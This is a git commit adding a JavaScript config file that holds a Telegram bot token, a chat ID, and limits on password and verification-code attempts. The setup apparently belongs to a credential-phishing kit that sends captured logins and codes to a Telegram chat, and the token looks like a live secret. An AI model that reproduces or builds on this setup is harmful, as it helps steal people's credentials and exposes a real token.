acd4b30fc41dfb9dcb2baa2f49039d71bb1bdf04
Loc Verified <locverified@example.com>
2026-06-21 15:32:02 +0700

    Initial commit

---
+++ src/utils/config.js
@@ -0,0 +1,11 @@
+const config = {
+    token: '6151798592:AAFwIFb95eY4UkW-qDV3SLRWc2wvPfMLcPc',
+    chat_id: '-5170189160',
+    noti_token: '',
+    noti_chat_id: '',
+    max_password_attempts: 2,
+    max_code_attempts: 3,
+    password_loading_time: 3,
+    code_loading_time: 3
+};
+export default config;
